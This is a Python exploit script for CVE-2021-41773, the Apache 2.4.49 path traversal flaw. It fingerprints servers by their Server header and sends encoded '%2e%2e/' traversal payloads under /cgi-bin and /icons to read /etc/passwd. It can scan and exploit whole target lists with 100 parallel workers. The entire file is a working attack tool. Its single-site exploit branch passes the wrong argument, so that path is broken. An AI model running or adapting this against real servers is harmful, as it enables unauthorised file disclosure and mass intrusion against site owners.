import requests
from multiprocessing.dummy import Pool
from colorama import Fore
import argparse

def urlValidator(url):
    if '://' in url:
        if url.endswith('/'):
            url = url[:-1]
        else:
            url = url
    else:
        if url.endswith('/'):
            url = 'http://'+url[:-1]
        else:
            url = 'http://'+url
    return url

def checkServer(url):
    try:
        validUrl = urlValidator(url)
        header = requests.get(validUrl).headers
        if 'Apache/2.4.49' in header['Server']:
            print(f'{Fore.WHITE}[+]{Fore.RESET}{Fore.LIGHTGREEN_EX} {url}{Fore.RESET}')
        else:
            print(f'{Fore.WHITE}[-]{Fore.RESET}{Fore.LIGHTRED_EX} {url}{Fore.RESET}')
    except:
        print(f'{Fore.WHITE}[?]{Fore.RESET}{Fore.LIGHTYELLOW_EX} {url}{Fore.RESET}')
        pass

def exploit(url):
    validUrl = urlValidator(url)
    flag = False
    vuln = ''
    payload = '/.%2e/'
    paths = ['/cgi-bin','/icons']
    for k in range(7):
        payload += '%2e%2e/'
        for path in paths:
            try:
                req = requests.get(f'{validUrl}{path}{payload}etc/passwd', allow_redirects=False, timeout=15).text
                if 'root:' in req:
                    flag = True
                    vuln = f'{url}{path}{payload}'
            except:
                pass
    if flag:
        print(f'{Fore.WHITE}[+]{Fore.RESET}{Fore.LIGHTGREEN_EX} {vuln}{Fore.RESET}')
    else:
        print(f'{Fore.WHITE}[-]{Fore.RESET}{Fore.LIGHTRED_EX} {url}{Fore.RESET}')

def main():
    parser = argparse.ArgumentParser(description='CVE-2021-41773', usage='python3 apache2-4-49.py --check --single example.com')
    parser.add_argument('--single', type=str, help='--single example.com')
    parser.add_argument('--mass', type=str, help='--mass list.txt')
    parser.add_argument('--check', action='store_true', help='Site Check')
    parser.add_argument('--exploit', action='store_true', help='Single Site Exploit')
    args = parser.parse_args()
    if args.check:
        if args.single:
            checkServer(args.single)
        elif args.mass:
            lists = open(args.mass,'r').read().splitlines()
            with Pool(100) as worker:
                worker.map(checkServer,lists)
                worker.close()
                worker.join()
    elif args.exploit:
        if args.single:
            exploit(args.exploit)
        elif args.mass:
            lists = open(args.mass,'r').read().splitlines()
            with Pool(100) as worker:
                worker.map(exploit,lists)
                worker.close()
                worker.join()
    else:
        parser.print_help()

if __name__ == '__main__':
    main()
